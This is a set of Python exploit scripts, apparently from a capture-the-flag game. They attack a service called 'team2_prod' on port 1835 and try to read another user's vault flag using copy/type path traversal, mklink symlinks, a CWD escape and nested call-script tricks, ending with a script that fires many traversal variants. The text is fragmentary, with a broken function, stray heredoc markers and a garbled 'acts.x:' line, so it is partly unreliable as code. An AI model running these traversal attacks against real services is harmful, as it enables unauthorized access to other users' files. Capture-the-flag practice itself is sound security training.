import socket, sys, time
host = sys.argv[1] if len(sys.argv)>1 else "team2_prod"
port = 1835
def recv(s, t=2.0):
    s.settimeout(t)
    data=b""

            if not c: break
            data+=c
    except: pass
    return data
s=socket.create_connection((host,port),timeout=5)
time.sleep(0.3)
print("BANNER:",recv(s,1.0).decode(errors="replace"))
s.sendall(b"pwnuser7\n"); time.sleep(0.3)
print("AFTERUSER:",recv(s,1.0).decode(errors="replace"))

EOF

cat > /tmp/getflag.py <<'EOF'
import socket, sys, time, re
host = sys.argv[1] if len(sys.argv)>1 else "team2_prod"
port = 1835
def recv(s, t=1.2):
    s.settimeout(t); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except: pass
    return data
def attempt(user, cmds):
    s=socket.create_connection((host,port),timeout=5); time.sleep(0.2); recv(s,0.8)
    s.sendall(user.encode()+b"\n"); time.sleep(0.2); recv(s,0.8)
    s.sendall(b"pw12345\n"); time.sleep(0.3); recv(s,0.8)
    out=b""
    for c in cmds:
        s.sendall(c.encode()+b"\n"); time.sleep(0.3); out+=recv(s,0.8)
    s.close(); return out.decode(errors="replace")
FLAG=re.compile(r"FLAG\{[^}]+\}")
# vector 1: copy
import random
u="u"+str(int(time.time()))[-6:]
o=attempt(u, ["copy ../vault/flag s1","type s1"])
m=FLAG.search(o)
if not m:
    # vector 2: mklink symlink
    u2="v"+str(int(time.time()))[-6:]
    o=attempt(u2, ["mklink ../vault/flag l1","type l1"])
    m=FLAG.search(o)
print(m.group(0) if m else "NOFLAG:"+o[:300])
EOF
python3 /tmp/getflag.py team2_prod

import socket, sys, time, re
host = sys.argv[1] if len(sys.argv)>1 else "team2_prod"
port = 1835
def recv(s, t=1.0):
    s.settimeout(t); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except: pass
    return data
def run(user, cmds):
    s=socket.create_connection((host,port),timeout=5); time.sleep(0.3); recv(s,1.0)
    s.sendall(user.encode()+b"\n"); time.sleep(0.3); recv(s,1.0)
    s.sendall(b"pw12345\n"); time.sleep(0.4); recv(s,1.0)
    out=b""
    for c in cmds:
        s.sendall(c.encode()+b"\n"); time.sleep(0.4); out+=recv(s,1.0)
    s.close(); return out.decode(errors="replace")
FLAG=re.compile(r"FLAG\{[^}]+\}")
tag=str(int(time.time()))[-7:]
o=run("cp"+tag, ["copy ../vault/flag s1","type s1"])
m=FLAG.search(o)
if not m:
    o2=run("mk"+tag, ["mklink ../vault/flag l1","type l1"])
    m=FLAG.search(o2); o=o2
print(m.group(0) if m else "NOFLAG:"+o[-300:])
EOF

import socket, sys, time, re, random
host = sys.argv[1] if len(sys.argv)>1 else "team2_prod"
port = 1835
def recv(s, t=1.0):
    s.settimeout(t); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except: pass
    return data
def run(cmds):
    s=socket.create_connection((host,port),timeout=5); time.sleep(0.3); recv(s,1.0)
    s.sendall(("u%d\n"%random.randint(1,9999999)).encode()); time.sleep(0.3); recv(s,1.0)
    s.sendall(b"pw12345\n"); time.sleep(0.4); recv(s,1.0)
    out=b""
    for c in cmds:
        s.sendall(c.encode()+b"\n"); time.sleep(0.4); out+=recv(s,1.0)
    s.close(); return out.decode(errors="replace")
FLAG=re.compile(r"FLAG\{[^}]+\}")
# primary: set CWD escape + call (leaks via unrecognized-command error)
o=run(["set CWD=/../vault","call flag"])
m=FLAG.search(o)
if not m:  # fallback: copy traversal
    o=run(["copy ../vault/flag s1","type s1"])
    m=FLAG.search(o)
if not m:  # fallback: mklink traversal
    o=run(["mklink ../vault/flag l1","type l1"])
    m=FLAG.search(o)
print(m.group(0) if m else "NOFLAG:"+o[-200:])
EOF

import socket,time,sys
host=sys.argv[1]; pw=sys.argv[2]
s=socket.create_connection((host,1835),timeout=5)
def r(t=1.0):
    s.settimeout(t); d=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            d+=c
    except: pass
    return d.decode(errors="replace")
time.sleep(0.3); r()
s.sendall(b"vault\n"); time.sleep(0.3); r()
s.sendall(pw.encode()+b"\n"); time.sleep(0.4); print("AFTERPW:",repr(r()))
s.sendall(b"type flag\n"); time.sleep(0.4); print("TYPE:",repr(r()))
s.close()
EOF

acts.x:
cat > /tmp/battery.py <<'EOF'
import socket,time,random,re
host="team2_prod"
FLAG=re.compile(r"FLAG\{[^}]+\}")
def sess(cmds):
    s=socket.create_connection((host,1835),timeout=5)
    def r(t=0.8):
        s.settimeout(t); d=b""
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except: pass
        return d.decode(errors="replace")
    time.sleep(0.25); r(0.8)
    s.sendall(("b%d\n"%random.randint(1,9999999)).encode()); time.sleep(0.25); r(0.8)
    s.sendall(b"pw12345\n"); time.sleep(0.3); r(0.8)
    out=""
    for c in cmds:
        s.sendall(c.encode()+b"\n"); time.sleep(0.3); out+=r(0.8)
    s.close(); return out
tests={
 "copy_abs":["copy /vault/flag x","type x"],
 "copy_deep":["copy ../../jails/vault/flag x","type x"],
 "copy_quote":["copy '../vault/flag' x","type x"],
 "copy_dotdotdot":["copy ..././vault/flag x","type x"],
 "type_trav":["type ../vault/flag"],
 "del_then":["cd ..","dir"],
 "call_nested":["echo copy ../vault/flag q > s","call s","type q"],
 "call_setuser_in":["echo set USERNAME=vault > s","echo type flag >> s","call s"],
 "echo_append":["echo type flag > s","echo x >> s","call s"],
 "mklink_swap":["mklink ../vault/flag lk","copy lk y","type y"],
 "copy_from_link":["mklink flag lk","copy ../vault/flag lk","type lk"],
}
for name,cmds in tests.items():
    try:
        o=sess(cmds); m=FLAG.search(o)
        print(name, "=>", (m.group(0) if m else o.replace(chr(10)," ")[:90]))
    except Exception as e:
        print(name,"ERR",e)
EOF
python3 /tmp/battery.py
